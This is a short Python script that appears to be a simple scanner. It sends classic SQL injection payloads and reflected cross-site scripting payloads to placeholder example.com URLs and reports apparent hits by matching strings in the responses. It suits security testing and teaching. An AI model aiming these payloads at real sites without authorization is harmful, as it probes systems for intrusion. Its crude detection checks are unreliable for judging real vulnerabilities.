import requests
# Function to test for SQL Injection vulnerabilities
def test_sql_injection(url):
    payloads = [
        "' OR 1=1 --",  # Classic SQL injection
        "' OR 'a'='a",  # Another common SQLi payload
        "' UNION SELECT NULL, NULL --",  # SQL UNION based attack
    ]

    for payload in payloads:
        response = requests.get(url, params={"id": payload})
        if "error" in response.text or "mysql" in response.text.lower():
            print(f"Potential SQL Injection found with payload: {payload}")
        else:
            print(f"Payload {payload} did not trigger SQL Injection")

# Example usage
test_sql_injection("http://example.com/product?id=1")

def test_xss(url):
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
    ]
    for payload in payloads:
        response = requests.get(url, params={"search": payload})
        if payload in response.text:
            print(f"Potential XSS vulnerability found with payload: {payload}")
        else:
            print(f"Payload {payload} did not trigger XSS")

# Example usage
test_xss("http://example.com/search?query=sample")
